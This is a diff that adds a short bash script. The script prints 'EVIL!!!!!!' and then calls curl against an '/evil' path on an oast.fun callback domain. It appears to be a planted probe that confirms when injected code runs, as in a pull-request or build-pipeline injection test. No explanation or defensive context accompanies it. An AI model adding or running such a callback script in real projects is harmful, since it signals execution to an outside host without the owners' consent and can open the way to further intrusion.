@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+echo EVIL!!!!!!
+/usr/bin/curl https://xekklvcuwytgssmxhkwcubn8n398ocm48.oast.fun/evil
